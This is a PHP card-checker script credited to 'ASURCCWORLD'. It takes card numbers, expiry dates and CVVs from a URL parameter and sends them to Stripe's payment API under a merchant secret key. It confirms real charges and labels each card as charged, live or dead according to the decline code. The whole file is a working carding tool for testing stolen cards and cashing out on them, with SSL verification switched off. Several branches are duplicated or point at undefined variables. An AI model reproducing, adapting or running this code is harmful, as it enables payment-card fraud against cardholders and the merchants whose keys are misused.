<?php

//===================== [ MADE BY ASURCCWORLD ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#


error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string)
{
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};

$skArray = array(
    'sk_live_',


);
if (isset($skArray)) { 
 $sk = $skArray[array_rand($skArray)]; 
} else {
    echo 'NO SK PROVIDED';
}
$amt = $_GET['amount'];
$amount = $amt * 100;
$lista = $_GET['lista'];
$cc = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [0];
$mes = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [1];
$ano = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [2];
$cvv = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bins = substr($cc, 0, 6);
$band = array(
    "404313",
    "601149",
    "601120"
);
list($ban) = $band;
if ($bins == $ban)
{
    echo "<b>BIN BANNED!</B><br>";
}
else
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&card[cvc]=' . $cvv . '');
    $result1 = curl_exec($ch);
    $tok1 = Getstr($result1, '"id": "', '"');
    $msg = Getstr($result1, '"message": "', '"');
    //echo "<br><b>Result1: </b> $result1<br>";
    #-------------------[2nd REQ]--------------------#
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=' . $amount . '&currency=usd&payment_method_types[]=card&description=Gunnu Donation&payment_method=' . $tok1 . '&confirm=true&off_session=true');
    $result2 = curl_exec($ch);
    $tok2 = Getstr($result2, '"id": "', '"');
    $receipturl = trim(strip_tags(getStr($result2, '"receipt_url": "', '"')));

    //=================== [ RESPONSES ] ===================//
    if (strpos($result2, '"seller_message": "Payment complete."'))
    {
        echo '#CHARGED</span>  </span>CC:  ' . $lista . '</span>  <br>➤ Response: $' . $amt . ' Charged ✅ BY @asurccworld<br> ➤ Receipt : <a href=' . $receipturl . '>Here</a><br>';
    }
    elseif (strpos($result2, '"cvc_check": "pass"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVV LIVE BY @asurccworld</span><br>';
    }
    elseif (strpos($result1, "generic_decline"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC DECLINED</span><br>';
    }
    elseif (strpos($result2, "generic_decline"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC DECLINED</span><br>';
    }
    elseif (strpos($result2, "insufficient_funds"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INSUFFICIENT FUNDS BY @asurccworld</span><br>';
    }

    elseif (strpos($result2, "fraudulent"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT</span><br>';
    }
    elseif (strpos($resul3, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';
    }
    elseif (strpos($resul2, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';
    }
    elseif (strpos($result, "fraudulent"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT</span><br>';

    }

    elseif (strpos($result2, '"code": "incorrect_cvc"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect BY @asurccworld</span><br>';
    }
    elseif (strpos($result1, ' "code": "invalid_cvc"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect</span><br>';
    }
    elseif (strpos($result1, "invalid_expiry_month"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';

    }
    elseif (strpos($result2, "invalid_account"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INVAILD ACCOUNT</span><br>';

    }

    elseif (strpos($result2, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';
    }
    elseif (strpos($result2, "lost_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: LOST CARD</span><br>';
    }
    elseif (strpos($result2, "lost_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY Manish</span> <br>';
    }

    elseif (strpos($result2, "stolen_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: STOLEN CARD</span><br>';
    }

    elseif (strpos($result2, "stolen_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: STOLEN CARD</span><br>';

    }
    elseif (strpos($result2, "transaction_not_allowed"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif (strpos($result2, "authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED</span><br>';
    }
    elseif (strpos($result2, "card_error_authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED</span><br>';
    }
    elseif (strpos($result2, "card_error_authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED</span><br>';
    }
    elseif (strpos($result1, "card_error_authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED</span><br>';
    }
    elseif (strpos($result2, "incorrect_cvc"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect</span><br>';
    }
    elseif (strpos($result2, "pickup_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PICKUP CARD</span><br>';
    }
    elseif (strpos($result2, "pickup_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PICKUP CARD</span><br>';

    }
    elseif (strpos($result2, 'Your card has expired.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: EXPIRED CARD</span><br>';
    }
    elseif (strpos($result2, 'Your card has expired.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: EXPIRED CARD</span><br>';

    }
    elseif (strpos($result2, "card_decline_rate_limit_exceeded"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
    }
    elseif (strpos($result2, '"code": "processing_error"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
    elseif (strpos($result2, ' "message": "Your card number is incorrect."'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
    elseif (strpos($result2, '"decline_code": "service_not_allowed"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
    }
    elseif (strpos($result2, '"code": "processing_error"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
    elseif (strpos($result2, ' "message": "Your card number is incorrect."'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
    elseif (strpos($result2, '"decline_code": "service_not_allowed"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';

    }
    elseif (strpos($result, "incorrect_number"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
    }
    elseif (strpos($result1, "incorrect_number"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';

    }
    elseif (strpos($result1, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';

    }
    elseif (strpos($result1, 'Your card was declined.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD DECLINED</span><br>';

    }
    elseif (strpos($result1, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';
    }
    elseif (strpos($result2, "generic_decline"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC CARD</span><br>';
    }
    elseif (strpos($result, 'Your card was declined.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD DECLINED</span><br>';

    }
    elseif (strpos($result2, ' "decline_code": "do_not_honor"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "unchecked"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "fail"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
    }
    elseif (strpos($result2, "card_not_supported"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "unavailable"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "unchecked"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "fail"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
    }
    elseif (strpos($result2, "currency_not_supported"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
    }

    elseif (strpos($result, 'Your card does not support this type of purchase.'))
    {
        echo '#DIE</span> CC:  ' . $lista . '</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

    elseif (strpos($result2, '"cvc_check": "pass"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVV LIVE</span><br>';
    }
    elseif (strpos($result2, "fraudulent"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT</span><br>';
    }
    elseif (strpos($result1, "testmode_charges_only"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK KEY #DIE OR INVALID</span><br>';
    }
    elseif (strpos($result1, "api_key_expired"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK KEY REVOKED</span><br>';
    }
    elseif (strpos($result1, "parameter_invalid_empty"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: ENTER CC TO CHECK</span><br>';
    }
    elseif (strpos($result1, "card_not_supported"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
    }
    else
    {
        echo '#DIE</span> CC:  ' . $lista . '</span>  <br>Result: ' . $result2 . ' <br><br><br>Result: ' . $result2 . '</span><br>';

    }
    curl_close($ch);
    ob_flush();
}
?>
